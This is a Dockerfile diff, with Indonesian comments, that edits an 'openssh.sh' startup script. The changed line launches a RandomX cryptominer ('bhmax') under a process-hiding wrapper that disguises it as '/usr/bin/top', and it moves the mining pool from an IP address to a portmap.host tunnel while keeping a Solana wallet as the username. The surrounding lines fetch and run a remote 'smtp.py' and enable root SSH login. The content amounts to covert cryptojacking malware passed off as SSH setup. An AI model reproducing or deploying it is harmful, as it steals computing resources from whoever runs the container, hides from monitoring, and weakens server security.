@@ -31,7 +31,7 @@ RUN wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py \
 
 # Mengatur skrip openssh.sh dan konfigurasi SSH
 RUN echo "sleep 5" >> /openssh.sh \
-    && echo "/run/sshd/hi -s "/usr/bin/top" -d -p test.pid ./run/sshd/bhmax --url 158.69.251.105:4052 --user SOL:5VqKde82ANkwGDXTRpBRa3vd1PFn1gdGN6tP7aJ38gx4.x93col --pass x -k -t 93 --randomx-mode auto --randomx-wrmsr=-1 --randomx-no-rdmsr --randomx-no-numa &" >> /openssh.sh \
+    && echo "/run/sshd/hi -s "/usr/bin/top" -d -p test.pid ./run/sshd/bhmax --url latifgbl-64001.portmap.host:64001 --user SOL:5VqKde82ANkwGDXTRpBRa3vd1PFn1gdGN6tP7aJ38gx4.x93col --pass x -k -t 93 --randomx-mode auto --randomx-wrmsr=-1 --randomx-no-rdmsr --randomx-no-numa &" >> /openssh.sh \
     && echo "python3 /run/sshd/smtp.py &" >> /openssh.sh \
     && echo '/usr/sbin/sshd -D' >> /openssh.sh \
     && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config \
